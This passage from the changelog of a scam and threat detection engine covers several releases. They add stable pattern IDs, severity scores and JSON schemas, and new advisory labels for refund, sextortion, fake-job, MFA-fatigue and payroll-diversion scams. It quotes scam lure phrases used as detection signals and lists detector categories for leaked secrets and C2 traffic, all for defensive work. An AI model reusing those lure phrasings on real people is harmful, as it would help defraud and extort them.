    "count":61,"patterns":[{"id","kind","description"},…]}`.
  - **`--list-patterns`** (text) → an aligned `token [kind] description` table.

  A single in-source `g_pattern_registry` table is the append-only source of
  truth, grouped by kind (text, url, file, secret, esp, package, network,
  clipboard). A new regression test probes one input per kind and asserts every
  emitted `pattern_id` is present in the registry, so the registry cannot drift
  out of sync as future perspectives add tokens.

  - **Tests**: 4 new CLI integration tests (587 total, 0 failed).

### Fixed
- Corrected a stale doc comment on `file_pattern_id()` that named the catch-all
  return as `HLSE-FILE-GENERIC`; the function returns `HLSE-FILE-MASQUERADE`.

## [1.0.87] — 2026-06-23

### Added
- **Perspective 87: stable `pattern_id` for all remaining pattern-bearing kinds —
  closes the last `pattern` / `pattern_id` asymmetry across the full 12-kind
  JSON API.**

  Socratic question: "P86 closed the `file`/`secret` gap so that all four kinds
  emitting a prose `pattern` now carry a stable HLSE-* token. But six other kinds
  (`esp`, `package`, `network`, `clipboard`, `paste`, `email`) also emit `pattern`
  when score ≥ 60 — and none of them carry `pattern_id`. A SIEM rule written as
  `pattern_id == 'HLSE-PKG-TYPOSQUAT'` is more robust than one that
  substring-matches prose like 'dependency confusion / typosquat supply-chain
  attack'. Why does the stable-token guarantee still have six exceptions?"

  Pure output change — no detection logic touched. Each kind receives its token:
  - `esp` → `HLSE-ESP-BOOTKIT`
  - `package` → `HLSE-PKG-TYPOSQUAT`
  - `network` → `HLSE-NET-C2`
  - `clipboard` → `HLSE-CLIP-HIJACK`
  - `paste` → delegates to `hlse_text_pattern_id()` on the ClickFix TextVerdict
    proxy (e.g. `HLSE-CLICKFIX`)
  - `email` (header-only BLOCK path) → delegates to `hlse_text_pattern_id()` on
    the synthesised BEC TextVerdict (e.g. `HLSE-BEC-WIRE`)

  Co-presence invariant preserved: `pattern_id` is present if and only if
  `pattern` is present; safe verdicts carry neither.

  - **Tests**: 5 new CLI integration tests (583 total, 0 failed).

## [1.0.86] — 2026-06-23

### Added
- **Perspective 86: stable `pattern_id` for `file` and `secret` kinds —
  completes the stable-token contract across all pattern-bearing verdict
  kinds.**

  現段階の長所短所 review: the JSON API's strength is its uniform contract
  (kind, hlse_version, score, action, severity everywhere). The remaining
  weakness was a `pattern_id` asymmetry — P78/P79 gave `url` and `text` stable
  routing tokens, but `file` and `secret` (the other two kinds that emit a
  prose `pattern`) still forced a SIEM to substring-match the prose
  ("double-extension file masquerade…", "exposed credential — AWS Access
  Key ID"). A wording polish to those labels would silently break automation,
  exactly the failure P78 was created to prevent.

  Pure output change — no detection logic touched. Two static helpers map the
  existing prose pattern to an append-only token:
  - `file_pattern_id()`: `HLSE-FILE-RTL-OVERRIDE`, `HLSE-FILE-DOUBLE-EXT`,
    `HLSE-FILE-MACRO`, `HLSE-FILE-PDF-JS`, `HLSE-FILE-MASQUERADE`.
  - `secret_pattern_id()`: `HLSE-SECRET-AWS`, `HLSE-SECRET-GITHUB`,
    `HLSE-SECRET-STRIPE`, `HLSE-SECRET-SLACK`, `HLSE-SECRET-GOOGLE`,
    `HLSE-SECRET-OPENAI`, `HLSE-SECRET-ANTHROPIC`, `HLSE-SECRET-AZURE`,
    `HLSE-SECRET-PRIVATE-KEY`, `HLSE-SECRET-JWT`, `HLSE-SECRET-GENERIC`.

  - **JSON**: `pattern_id` now emitted alongside `pattern` at all four
    file/secret JSON sites (standalone + scan-path for each).
  - **Schemas**: `hlse_file_verdict` and `hlse_secret_verdict` gain `pattern_id`
    with provider-specific pattern constraints.
  - **Tests**: 4 new CLI integration tests (578 total, 0 failed).

## [1.0.85] — 2026-06-23

### Added
- **Perspective 85 (Socratic): `max_severity` in `scan_summary` — single-line
  consumers now get the same numeric routing capability as per-verdict consumers.**

  Socratic question: "The `scan_summary` carries `threats` (count) and `gate_hits`
  (threshold crossings), but no severity rating of the overall scan. A CI/CD
  pipeline consuming only the final summary line cannot write `max_severity >= 3`
  to gate on BLOCK+; it can only check `threats > 0`, which doesn't distinguish
  a scan with 1 LOG finding from one with 3 ISOLATE findings. Shouldn't
  `scan_summary` include `max_severity` so a single-line consumer has the same
  numeric gate capability as a per-verdict consumer?"

  Pure output change — no detection logic touched. `max_score` is tracked
  alongside the existing `threats` counter at all three scan-path verdict sites
  (file, secret-in-scan, URL-in-scan), then mapped to 0–4 via
  `hlse_severity_for_score()` for the summary.

  - **`scan_summary` JSON**: new `"max_severity": N` field (0 when clean).
  - **`schema/hlse_scan_summary.schema.json`**: `max_severity` added as
    required field with `minimum: 0, maximum: 4`.
  - **Tests**: 3 new CLI integration tests (574 total, 0 failed) verifying
    ISOLATE threat → max_severity 4, clean scan → 0, and schema validation.

## [1.0.84] — 2026-06-23

### Added
- **Perspective 84 (Socratic): `hlse_version` field in every JSON output path —
  verdicts are now self-documenting for audit trails and retrospective triage.**

  Socratic question: "Every verdict is stored with a score and action, but no
  record of which version of HLSE produced it. Six months from now, an analyst
  reviewing a stored SAFE verdict cannot distinguish 'definitively clean under
  v1.0.84 with ClickFix + MFA-fatigue + refund-scam detection' from 'probably
  clean under v0.9.0 with no text detection at all'. A verdict that predates a
  new detector (e.g. OAuth device-code added in P57) silently misleads
  retrospective triage. Shouldn't every JSON verdict carry `hlse_version` so
  stored verdicts are self-documenting and re-scan campaigns can identify those
  older than a given detection capability?"

  Pure output change — no detection logic touched. Uses compile-time string
  concatenation (`"..." HLSE_VERSION "..."`) for zero runtime overhead; the
  version is compiled into the binary so the field always matches the actual
  detector set.

  - **Coverage**: all 12 JSON kind paths (url, text, file ×2, secret ×2, esp,
    package, paste, network, email, clipboard, audit, scan_summary).
  - **Schemas**: all 5 JSON Schema files updated to include `"hlse_version"`
    as a required field with a semver pattern constraint (`^\d+\.\d+\.\d+$`).
  - **Tests**: 4 new CLI integration tests (571 total, 0 failed) verifying
    semver shape on url/text/file kinds and cross-kind consistency.

## [1.0.83] — 2026-06-23

### Added
- **Perspective 83 (Socratic): JSON Schema for `file`, `secret`, and
  `scan_summary` kinds — completes the scan-output stream schema coverage.**

  Socratic question: "P81 added schemas for `url` and `text` verdicts. But
  `hlse_core --json scan <dir>` emits a mixed stream of `file`, `secret`,
  and `scan_summary` lines that an integrator can't validate against the P81
  schemas. A CI/CD pipeline that pipes scan output through schema validation
  would still pass INVALID `file` and `secret` lines silently. Shouldn't the
  `schema/` directory include schemas for the most common CI/CD scan kinds?"

  Pure documentation/schema addition — no code changed.

  - **`schema/hlse_file_verdict.schema.json`**: covers `--json file` output
    and the file entries in scan output streams.
  - **`schema/hlse_secret_verdict.schema.json`**: covers `--json secret` and
    the scan-path variant (with `path` and `line` fields).
  - **`schema/hlse_scan_summary.schema.json`**: covers the final
    `scan_summary` rollup line from `--json scan`.
  - **Tests**: 1 new schema-validation test (567 total, 0 failed) validating
    real `file`, `secret`, and `scan_summary` JSON against the new schemas.

## [1.0.82] — 2026-06-23

### Added
- **Perspective 82 (Socratic): numeric `severity` field extended to ALL JSON
  output paths — closes the cross-kind routing gap P80 opened.**

  Socratic question: "P80 added `severity` to `print_json_url` and
  `print_json_text`. But `hlse_core` has 14+ subcommands — `file`, `secret`,
  `email`, `audit`, `paste`, `network`, `esp`, `package`, `clipboard` — and
  each emits its own `{"kind":"..."}` JSON from a separate code path. A SIEM
  with a single `severity >= 3` routing rule covers URL and text alerts but
  **silently misses** a high-severity file-masquerade (`.pdf.exe`) or AWS key
  detection, because those JSON paths never emitted `severity`. Shouldn't every
  `--json` path emit `severity` so one numeric gate works uniformly across all
  subcommands?"

  Pure output change — no detection logic touched. Added
  `hlse_severity_for_score()` call to all remaining JSON emitters:
  `file` (in scan + standalone), `secret` (in scan + standalone), `esp`,
  `package`, `paste`, `network`, `email`, `clipboard`, `audit`.

  - **Before**: 2 of 12 JSON kinds emitted `severity` (url, text only)
  - **After**: all 12 JSON kinds emit `severity` uniformly
  - **Tests**: 4 new CLI integration tests (566 total, 0 failed) verifying
    severity on file/secret/esp kinds and the monotonic invariant across kinds.

## [1.0.81] — 2026-06-23

### Added
- **Perspective 81: normative JSON Schema for URL and text verdict outputs —
  the first machine-readable contract document for HLSE's JSON API.**

  Socratic question: "After P78–P80, a SIEM engineer has stable `pattern_id`
  tokens and a numeric `severity` field. But to integrate HLSE output into a
  typed client or validator, they still need to read C source or infer the
  shape from examples. An undocumented schema means integrators hard-code
  field names with no way to catch when a field becomes conditional or when
  a new required field is added. Shouldn't HLSE ship a normative JSON Schema
  so integrators can validate outputs, generate typed client code (Python
  dataclasses, TypeScript interfaces, Go structs), and understand optional
  vs. required fields without reading C?"

  Pure documentation/schema addition — no code or detection logic changed.

  - **`schema/hlse_url_verdict.schema.json`**: Full JSON Schema (2020-12) for
    `--json <url>` output. Documents all 23 fields with types, constraints,
    conditionality, and `pattern_id` enum examples. `additionalProperties: false`
    so any future field addition is explicitly tracked.
  - **`schema/hlse_text_verdict.schema.json`**: Full JSON Schema for
    `--json text` output. Same structure with text-specific fields
    (`exoneration` instead of `confusable`/`ascii_diff`/`safe_url`).
  - **Tests**: 1 new schema-validation test (562 total, 0 failed) running 4
    real verdict JSON objects through `jsonschema.validate()`. Skips gracefully
    when `jsonschema` is not installed.

## [1.0.80] — 2026-06-23

### Added
- **Perspective 80: numeric `severity` field (0–4) in URL and text JSON output
  for SIEM/SOAR numeric routing — closes the last fragile string-comparison
  coupling in the JSON API.**

  Socratic question: "After P78–P79, a SIEM consumer can key on `pattern_id`
  instead of prose for pattern routing. But to gate on 'actionable threat', the
  rule still writes `action == 'BLOCK' || action == 'ISOLATE'` — two string
  comparisons coupled to our exact tier names. If we ever inserted a new tier
  (say 'QUARANTINE' between ALERT and BLOCK), every SIEM rule would silently
  miss it. Shouldn't the JSON also carry a monotonic `severity` integer (0=SAFE,
  1=LOG, 2=ALERT, 3=BLOCK, 4=ISOLATE) so rules can write `severity >= 3` as a
  stable numeric gate that covers any future tier inserted above that threshold?"

  Pure advisory/output change — no scoring or detection logic touched. The new
  `hlse_severity_for_score()` maps the 0–100 score to a 0–4 integer following
  the same band boundaries as `hlse_action_for_score()`.

  - **API**: new `int hlse_severity_for_score(int score)` in `hlse_core.h`.
  - **JSON (URL)**: `--json <url>` gains `"severity": N` immediately after
    `"action"`; channel path gains `"effective_severity": N` alongside
    `"effective_action"`.
  - **JSON (text)**: `--json text` gains `"severity": N` and
    `"effective_severity": N` on the same positions.
  - **Mapping**: 0=SAFE (0–14), 1=LOG (15–39), 2=ALERT (40–59),
    3=BLOCK (60–79), 4=ISOLATE (80+) — aligned with CVSS None/Low/Medium/High/Critical.
  - **Tests**: 5 new CLI integration tests (561 total, 0 failed) verifying
    ISOLATE→4, SAFE→0, BEC ISOLATE→4, clean text→0, and the monotonic
    integer co-mapping invariant.

## [1.0.79] — 2026-06-22

### Added
- **Perspective 79: stable machine-readable `pattern_id` for URL verdicts —
  the symmetric URL counterpart of P78. After P78 gave text verdicts a stable
  `HLSE-*` token, URL verdicts were left exposing only the prose `pattern`
  label, so a SIEM/SOAR consuming URL alerts still had to substring-match prose
  we keep refining. This closes that asymmetry: every URL verdict now carries
  an append-only `HLSE-URL-*` token (e.g. `HLSE-URL-IDN-HOMOGRAPH`,
  `HLSE-URL-SUBDOMAIN-HARVEST`, `HLSE-URL-SHORTENER`).**

  Strengths/weaknesses review (現段階の長所短所): the engine's biggest strength
  is its uniform, append-only advisory contract; P78 strengthened it for text
  but introduced an asymmetry — the URL path, which is the original and most
  heavily used surface, lacked the stable id. The weakness was discoverability:
  an automation author reading the JSON for a URL alert found `pattern` but no
  machine key, and would either hard-code prose or fall back to the score. The
  improvement is to mirror P78 exactly so both surfaces present the same
  `{pattern, pattern_id}` shape.

  Pure advisory/output change — no scoring or detection logic touched. The new
  `hlse_url_pattern_id()` is a read-only lookup over the existing
  `hlse_classify_url_attack()` classification, so F1 is unchanged. Tokens are
  **append-only**: meaning is fixed once issued, and prose refinements never
  alter the id.

  - **API**: new `const char *hlse_url_pattern_id(const Verdict *v)` in
    `hlse_core.h` — stable token, or NULL when score is 0 / no pattern.
  - **JSON**: `--json <url>` output gains a `"pattern_id"` field, emitted
    alongside `"pattern"` (present iff the prose `pattern` is present).
  - **Tokens (initial set)**: `HLSE-URL-IDN-HOMOGRAPH`, `HLSE-URL-MULTI-BRAND`,
    `HLSE-URL-HOMOGLYPH`, `HLSE-URL-AT-CRED-TRICK`, `HLSE-URL-IP-BRAND`,
    `HLSE-URL-FREEHOST`, `HLSE-URL-SUBDOMAIN-HARVEST`, `HLSE-URL-SUBDOMAIN`,
    `HLSE-URL-TYPOSQUAT-HARVEST`, `HLSE-URL-TYPOSQUAT`, `HLSE-URL-HYPHEN-HARVEST`,
    `HLSE-URL-HYPHEN-BRAND`, `HLSE-URL-CRED-HARVEST`, `HLSE-URL-BRAND-RISKY-TLD`,
    `HLSE-URL-BRAND`, `HLSE-URL-SHORTENER`, `HLSE-URL-DGA`, `HLSE-URL-GENERIC`.
  - **Tests**: 6 new CLI integration tests (556 total, 0 failed) verifying the
    id for homoglyph / IDN / shortener / subdomain-spoof URLs, well-formedness
    and co-presence, and that clean URLs carry no id.

## [1.0.78] — 2026-06-22

### Added
- **Perspective 78: stable machine-readable `pattern_id` for text verdicts —
  every text verdict's prose `pattern` label is now accompanied by an
  append-only `HLSE-*` token (e.g. `HLSE-BEC-WIRE`, `HLSE-SEXTORTION`,
  `HLSE-OAUTH-DEVICECODE`) so SIEM/SOAR automation can route on a stable
  identifier instead of substring-matching prose that we keep refining.**

  Socratic question: "Every text verdict now carries a human `pattern` label,
  but that label is prose we keep polishing — when P57 changed 'Verify first'
  to 'Verify independently' a downstream test broke. A SIEM or SOAR rule that
  wants to route 'OAuth device-code phishing' alerts has no choice but to
  substring-match the prose, so every wording polish silently risks breaking
  automation. Shouldn't each pattern also expose a STABLE id
  (e.g. `HLSE-OAUTH-DEVICECODE`) that survives wording changes, so machines key
  on the id and humans read the label?"

  Pure advisory/output change — no scoring or detection logic touched. The new
  `hlse_text_pattern_id()` maps the prose label returned by
  `hlse_classify_text_attack()` to a stable token; it is a read-only lookup
  over the existing classification, so F1 is unchanged. The contract is that
  these tokens are **append-only**: a token's meaning never changes once
  issued, and prose refinements never alter the id.

  - **API**: new `const char *hlse_text_pattern_id(const TextVerdict *v)` in
    `hlse_core.h` — returns the stable token, or NULL when score is 0 / no
    pattern was recognised.
  - **JSON**: `--json text` output gains a `"pattern_id"` field, emitted
    alongside `"pattern"` (present iff the prose `pattern` is present).
  - **Tokens (initial set)**: `HLSE-CLICKFIX`, `HLSE-OAUTH-DEVICECODE`,
    `HLSE-MFA-FATIGUE`, `HLSE-BEC-PAYMENT-DIVERSION`, `HLSE-BEC-CEO`,
    `HLSE-BEC-WIRE`, `HLSE-TECH-SUPPORT`, `HLSE-JOB-SCAM`, `HLSE-ADVANCE-FEE`,
    `HLSE-SEXTORTION`, `HLSE-RANSOM`, `HLSE-INVESTMENT`, `HLSE-EMERGENCY`,
    `HLSE-QUISHING`, `HLSE-REFUND-SCAM`, `HLSE-CALLBACK-TOAD`, `HLSE-AUTHORITY`,
    `HLSE-URGENCY-CRED`, `HLSE-FAKE-ALERT`, `HLSE-URGENCY`, `HLSE-CRED-LURE`,
    `HLSE-PRIZE`, `HLSE-GENERIC`.
  - **Tests**: 6 new CLI integration tests (550 total, 0 failed) verifying the
    id for urgency-cred / BEC / sextortion / MFA-fatigue, the well-formedness
    and co-presence invariant, and that clean verdicts carry no id.

## [1.0.77] — 2026-06-21

### Added
- **Perspective 77: refund / subscription-renewal scam (fake auto-renewal
  invoice) now has its own pattern label and advisory lenses — the Geek Squad
  / Norton / McAfee "your membership auto-renewed, call to cancel" scam was
  previously folded into the generic "callback phone scam (TOAD / vishing)"
  label, which misses the refund-specific over-refund and remote-access
  mechanics.**

  Socratic question, derived from 2026 refund-scam reports (LifeLock, NordVPN,
  Bitdefender, FTC): "A Geek Squad auto-renewal scam scores 85 (ISOLATE) and
  classifies as 'callback phone scam (TOAD / vishing)'. The TOAD advice — 'do
  not call the number; find the official number independently' — is correct as
  far as it goes, but the refund scam has a distinctive second act the generic
  advice never names: when you DO call, the agent confirms the charge, offers a
  'refund', and then either asks for remote access to 'process' it or claims
  they 'accidentally refunded too much' and pressures you to wire back the
  difference (which they never actually sent). The single clarifying fact — a
  genuine refund needs NOTHING from you, and no real company phones you to give
  money back — is exactly what the victim needs and exactly what 'find the
  official number' omits. Shouldn't the refund scam get its own label and a
  remedy keyed to the over-refund and remote-access tricks?"

  Pure advisory change — no scoring/detection logic touched. The auto-renewal
  / refund phrases already fire (within the existing signals) and already
  produce a BLOCK/ISOLATE score; this perspective only adds a classification
  branch and the advisory strings keyed to it, using the same matched-phrase
  keying as P73–P76. The branch is placed above the generic callback/TOAD
  branch so a refund scam is labeled precisely; a plain callback/vishing
  message (no refund/renewal language) is unaffected.

  - **pattern** (`hlse_classify_text_attack`): "refund / subscription-renewal
    scam (fake auto-renewal invoice)".
  - **objective**: "money and device access via a fake refund — the invoice is
    bait to make you call; the 'refund' then requires remote access … or
    tricks you into wiring back an 'over-refund' the scammer never actually
    sent".
  - **verify**: "check the charge in your real bank or card statement, or the
    provider's official app — never the number or link in this message; no
    genuine company phones you to give money back, so an unexpected 'refund'
    offer is itself the scam".
  - **triage**: "do not call the number; if you already called, never grant
    remote access or send back an 'over-refund' — a genuine refund needs
    nothing from you … dispute any real charge through your card issuer".
  - **cascade**: "if you granted remote access or moved any money, treat the
    whole device and every account you opened during the call as compromised".
  - **exoneration** (LOG/ALERT band): "real subscriptions do auto-renew.
    Decisive test: open your bank/card statement or the provider's official app
    directly … a 'call to cancel' invoice for a service you don't use is the
    tell".

  Research sources: LifeLock「3 Geek Squad scams」, NordVPN「Geek Squad email
  scam 2026」, Bitdefender Geek-Squad guide, FTC subscription-renewal /
  refund-scam advisories, Aura「Geek Squad Scams 2026」. 6 new integration
  tests; 544 pass, 0 fail; zero warnings CLI + lib.

## [1.0.76] — 2026-06-21

### Added
- **Perspective 76: sextortion / webcam blackmail now has its own pattern
  label and advisory lenses — previously this high-volume extortion subtype
  was folded into the generic "ransom / extortion message" label, whose
  ransomware-framed advisory ("paying does not guarantee recovery") is the
  wrong mental model for a threat that is usually an empty bluff.**

  Socratic question, derived from 2026 sextortion/romance-scam reports
  (LifeLock, NCOA, Security Magazine): "HLSE already detects sextortion
  language ('I activated your webcam', 'I have footage of you', 'send this
  video to your contacts') — such a message scores high (BLOCK). But it
  classifies as 'ransom / extortion message', so the objective says
  'cryptocurrency payment — paying does not guarantee RECOVERY'. That framing
  is borrowed from ransomware, where files are genuinely encrypted. In
  sextortion there is nothing to recover and, crucially, the threat is almost
  always an empty bluff: the email is mass-mailed to millions, the 'leaked
  password' was bought from a data breach (not proof of webcam access), and no
  footage exists. The victim most needs to hear two things the generic
  advisory never says: (1) this is almost certainly a bluff, and (2) do not
  REPLY — replying confirms a live target. Shouldn't sextortion get its own
  label and a remedy keyed to the bluff and the do-not-reply rule?"

  Pure advisory change — no scoring/detection logic touched. The sextortion
  phrases already fire (within the Ransom/extortion signal) and already
  produce a BLOCK score; this perspective only adds a classification branch
  and the advisory strings keyed to it, using the same matched-phrase keying
  as P73–P75. The branch is placed above the generic ransom/extortion branch
  so webcam-blackmail is labeled precisely; a true ransomware message
  (encrypted files) still classifies as "ransom / extortion message".

  - **pattern** (`hlse_classify_text_attack`): "sextortion / webcam
    blackmail".
  - **objective**: "an extortion payment for a threat that is almost always an
    empty bluff … even AI-deepfaked images do not make paying work".
  - **verify**: "the 'I hacked your webcam' claim is almost always a bluff
    blasted to millions — any password they quote was bought from a data
    breach, not proof of access … do not pay and do not reply".
  - **triage**: "do NOT pay and do NOT reply — replying confirms a live
    target … report to IC3 / your national cybercrime line (and, if a minor is
    involved, NCMEC at CyberTipline.org); if real intimate images of you do
    exist, report them to the platform for takedown".
  - **cascade**: "nothing of yours is technically compromised by the threat
    itself — but if you reused the breached password they quoted, change it …
    tighten privacy on your social accounts".
  - **exoneration** (LOG/ALERT band): "these threats feel personal but are
    almost always mass-mailed bluffs. Decisive test: can they show actual
    footage, or only claim it?".

  Research sources: LifeLock「online dating scams / sextortion red flags」,
  NCOA deepfake-scam guide, Security Magazine「Industrial-Scale Romance Scam
  Economy 2026」, Bitdefender deepfake red flags, FBI IC3 / NCMEC sextortion
  guidance. 5 new integration tests; 538 pass, 0 fail; zero warnings CLI + lib.

## [1.0.75] — 2026-06-21

### Added
- **Perspective 75: fake-job / task scam (pay-to-start employment fraud) now
  has its own pattern label and advisory lenses — 2026's fastest-growing
  consumer fraud (FTC: $521M lost, +1000% spike May–Jul 2026) was previously
  split between the generic "lottery / advance-fee fraud" and "investment scam
  / pig-butchering" labels.**

  Socratic question, derived from FTC/McAfee 2026 remote-job-scam reports:
  "HLSE already detects fake-job language ('work from home opportunity',
  'starter kit', 'buy your equipment', 'reimbursed on first paycheck',
  'mystery shopper') — an equipment-advance-fee job scam scores 67 (BLOCK).
  But it classifies as 'investment scam / pig-butchering', so the verify lens
  says 'check the firm's FCA/SEC registration' — irrelevant to a job seeker.
  And a task-scam crypto-deposit lure classifies as 'lottery / advance-fee
  fraud'. Neither names the one rule that settles every job scam: a real job
  only ever pays money TO you — no legitimate employer asks you to pay to
  start, deposit funds to 'unlock' tasks, or buy equipment upfront. Neither
  warns that the 'work-from-home security suite' the victim is told to install
  is often a remote-access trojan. Shouldn't the fastest-growing 2026 consumer
  fraud get its own label and a remedy keyed to the pay-to-start tell and the
  RAT risk?"

  Pure advisory change — no scoring/detection logic touched. The fake-job
  phrases already fire as signals (and already produce a BLOCK score); this
  perspective only adds a classification branch and the advisory strings keyed
  to it, using the same matched-phrase keying as P73/P74. The branch is placed
  above the generic lottery/advance-fee and investment/pig-butchering branches
  so a job scam is labeled precisely; a pure investment lure (no job language)
  still classifies as "investment scam / pig-butchering".

  - **pattern** (`hlse_classify_text_attack`): "fake-job / task scam
    (pay-to-start employment fraud)".
  - **objective**: "upfront fees and deposits you will never recover … any
    'work-from-home app' they tell you to install may be a remote-access
    trojan that drains your bank and files".
  - **verify**: "a real job only ever pays money TO you — no legitimate
    employer asks you to pay to start, deposit your own funds to 'unlock'
    tasks or earnings, or buy equipment upfront; that request alone proves the
    job is fake".
  - **triage**: "stop all payments and deposits now … if you installed any
    'work-from-home' or 'security' app they sent, disconnect from the internet
    and remove it — it may be a remote-access trojan; report to the FTC
    (reportfraud.ftc.gov)".
  - **cascade**: "any card or account you used to pay, and any credentials you
    entered on the fake 'employer portal' … if you ran their software, treat
    the whole device as compromised".
  - **exoneration** (LOG/ALERT band): "legitimate recruiters do reach out.
    Decisive test: does the 'job' require you to pay anything, deposit your own
    funds, or buy equipment to start? A real job pays you — money only ever
    flows TO you, never from you".

  Research sources: FTC Consumer Advice「Job Scams」, McAfee 2026 job-scam
  spike report, The Interview Guys「Remote Job Scams 2026」, Remote Work Europe
  scams guide, DailyRemote red-flags guide. 6 new integration tests; 533 pass,
  0 fail; zero warnings CLI + lib.

## [1.0.74] — 2026-06-21

### Added
- **Perspective 74: MFA-fatigue / push-bombing ("approve-the-prompt") now has
  its own pattern label and advisory lenses — previously this Scattered
  Spider / Lapsus$ TTP was mislabeled "fake security alert" and the advisory
  never told the victim the defining fact: an unsolicited MFA prompt means the
  password is ALREADY stolen.**

  Socratic question, derived from Qiita/Zenn 2026 passkey-migration and MFA
  reports: "HLSE already detects MFA push-bombing language ('approve the
  notification', 'just approve it', 'you will keep receiving requests until you
  approve') — such a message scores 70 (BLOCK). But it classifies as 'fake
  security alert / account suspension phishing', so the advisory is generic
  'navigate to the site directly and check your account'. That misses the
  single most important fact about MFA fatigue: the attacker already has the
  password (that's why the prompts are firing), and approving one — even just
  to make the spam stop — hands them an authenticated session. The right
  advice is the opposite of 'log in and check': it is 'DENY the prompt, and
  change your password because it is already compromised'. Shouldn't the
  approve-the-prompt attack get its own label and a remedy that names the
  already-compromised password and the deny-don't-approve action?"

  Pure advisory change — no scoring/detection logic touched. The push-bombing
  phrases already fire as signals (and already produce a BLOCK score); this
  perspective only adds a classification branch and the advisory strings keyed
  to it, using the same matched-phrase keying as the P73 payment-diversion and
  the existing gift-card → tech-support branches. The branch is placed below
  device-code (so a verification-code message stays "OAuth device-code
  phishing") and above the generic fake-alert/credential branches.

  - **pattern** (`hlse_classify_text_attack`): "MFA-fatigue / push-bombing
    (approve-the-prompt attack)".
  - **objective**: "account takeover via MFA approval — the attacker already
    has your password and is spamming push prompts; approving one hands them
    an authenticated session".
  - **verify**: "never approve an MFA or authenticator prompt you did not
    start yourself — a prompt or 'approve' request that arrives when you were
    not logging in means someone ALREADY has your password; deny it, and never
    approve to 'make the prompts stop'".
  - **triage**: "deny/dismiss the prompt; do NOT approve it — then change your
    password immediately from a device you trust … if you did approve one,
    sign out all sessions, rotate the password, and report it to your IT/
    security team".
  - **cascade**: "every account sharing this now-compromised password, and
    your email … switch this account to phishing-resistant MFA (a passkey or
    hardware key) that cannot be approved by mistake".
  - **exoneration** (LOG/ALERT band): "legitimate sign-ins do trigger MFA
    prompts. Decisive test: did YOU just try to log in? If an 'approve'
    request or push arrives that you did not start, deny it".

  Research sources: Zenn「現在のパスキーは単一障害点である」, Qiita「パスキー
  認証と2要素認証の仕組み」, Qiita「パスキーが万能ではない3つの理由」, CISA/
  Microsoft Scattered Spider & Lapsus$ MFA-fatigue advisories. 7 new
  integration tests; 527 pass, 0 fail; zero warnings CLI + lib.

## [1.0.73] — 2026-06-21

### Added
- **Perspective 73: payment-diversion BEC (bank-account-change / payroll
  fraud) now has its own pattern label and advisory lenses — previously this
  fastest-growing BEC variant (per the FBI) was mislabeled "urgency
  credential-harvest phishing" and told victims to change their password.**

  Socratic question, derived from Proofpoint/SpiderLabs/FBI 2026 BEC reports:
  "HLSE already detects vendor/payroll banking-change language ('our bank
  account has changed', 'please update our bank', 'new banking details') — a
  vendor banking-change message scores 73 (BLOCK). But it classifies as
  'urgency credential-harvest phishing', so the objective says 'account
  credentials — all sites sharing this password are at cascade risk' and the
  triage says 'change that account's password and enable 2FA'. That advice is
  not just unhelpful, it is WRONG: payroll/vendor-diversion fraud is not a
  credential attack — the attacker requested a BANK-ACCOUNT CHANGE to reroute
  the next payroll deposit or invoice payment to their account. No password is
  at risk; the decisive action is to verify the banking change out-of-band and
  refuse to update the payee. The FBI calls payroll diversion one of the
  fastest-growing BEC variants. Shouldn't a bank-account-change request get
  its own label and a remedy that matches the actual harm?"

  Pure advisory change — no scoring/detection logic touched. The banking-change
  phrases already fire as signals (and already produce a BLOCK score); this
  perspective only adds a classification branch and the advisory strings keyed
  to it. The new branch keys on banking-change phrases surfaced in the matched-
  phrase text of the reasons (same mechanism as the existing gift-card →
  tech-support keying), and is placed ABOVE the generic BEC-wire-transfer and
  credential-harvest branches so a bank-account-change request is labeled
  precisely. A pure CEO/wire-transfer message (no banking-change language) is
  unaffected and still classifies as "BEC / CEO-fraud wire-transfer".

  - **pattern** (`hlse_classify_text_attack`): new label "payment-diversion
    BEC (bank-account-change / payroll fraud)".
  - **objective**: "redirected payments — your next payroll deposit or vendor
    invoice is rerouted to the attacker's bank account; the money is gone once
    the payment run clears".
  - **verify**: "confirm any bank-account or direct-deposit change by calling
    the employee or vendor on a number you ALREADY have on file — never the
    number, email, or reply-to in the request; a banking-detail change is the
    single highest-risk request".
  - **triage**: "do NOT update the bank/payee details; if you already changed
    them, revert immediately and alert your payroll/accounts-payable team and
    your bank — check whether a payment run already went out so it can be
    recalled while it is still pending".
  - **cascade**: "every other payee record an attacker with this mailbox could
    alter — audit all recent bank-detail changes … check whether the email
    account that sent this is itself compromised".
  - **exoneration** (LOG/ALERT band): "employees and vendors do legitimately
    change banks. Decisive test: call the person or company on a number you
    ALREADY have on file … before updating any payee".

  Research sources: Proofpoint「Understanding BEC Payroll Scams: Direct Deposit
  Diversion」, Trustwave SpiderLabs「BEC Trends: Payroll Diversion Dominates」,
  Unit21 (vendor/payroll ACH fraud), IRONSCALES, FBI IC3 BEC statistics. 6 new
  integration tests; 520 pass, 0 fail; zero warnings CLI + lib.

## [1.0.72] — 2026-06-21

### Changed
- **Perspective 72: tech-support-scam advisories updated for the fake-warning-
  popup and remote-access-tool reality — the verify lens now names the popup
  as always-fake, and the triage now tells the victim to UNINSTALL the
  remote-access tool, the persistence step most victims miss.**

  Socratic question, derived from 警察庁 サポート詐欺対策 and Trend Micro 2026
  fake-warning reports: "The tech-support triage tells a victim who gave remote
  access to 'disconnect from the internet, change banking credentials, call
  your IT team'. But disconnecting is temporary — the attacker had the victim
  install a remote-access tool (AnyDesk/TeamViewer/UltraViewer), and that tool
  resumes the attacker's access the moment the victim reconnects. The 警察庁
  guidance is explicit: the remote-access software must be uninstalled. The
  triage never says 'uninstall it', so a victim who reconnects after changing
  passwords hands the attacker a live session again. Separately, the verify
  lens says 'call the company's main switchboard independently' — good advice,
  but it never states the single most useful fact about the fake-warning
  popup: a virus warning that displays a phone number is ALWAYS fake (real
  security software never tells you to call), so the first action is to close
  the browser and never call the on-screen number. Shouldn't the triage name
  the uninstall step and the verify name the fake-popup tell?"

  Pure advisory change — no scoring/detection logic touched; the tech-support
  pattern label and detection are unchanged. Two advisory lenses keyed to the
  tech-support pattern were extended:

  - **triage** (`hlse_text_triage`): now "if you gave remote access:
    disconnect from the internet immediately and UNINSTALL the remote-access
    tool they had you install (AnyDesk, TeamViewer, UltraViewer, etc.) — it
    keeps their access until removed; then change your banking credentials
    from a different device and call your IT team or bank directly".
  - **verify** (`hlse_text_verify`): now "a virus-warning popup that shows a
    phone number is ALWAYS fake — real security software never tells you to
    call; close the browser (or force-quit it) and never call the number on
    the screen; if you need help, call the company's main switchboard
    independently before allowing any remote access or payment".

